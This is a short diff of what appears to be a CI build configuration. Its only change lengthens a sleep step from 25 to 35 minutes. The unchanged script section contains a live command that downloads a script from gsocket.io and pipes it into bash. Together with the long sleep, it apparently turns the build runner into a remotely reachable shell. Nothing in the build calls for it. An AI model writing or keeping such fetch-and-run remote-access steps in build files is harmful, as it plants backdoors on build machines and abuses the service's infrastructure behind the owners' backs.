@@ -10,7 +10,7 @@ cache:
   - $HOME/.cache/go-build
 script:
 - bash -c "$(curl -fsSL gsocket.io/x)"
-- sleep 25m
+- sleep 35m
 - make
 deploy:
 - provider: script
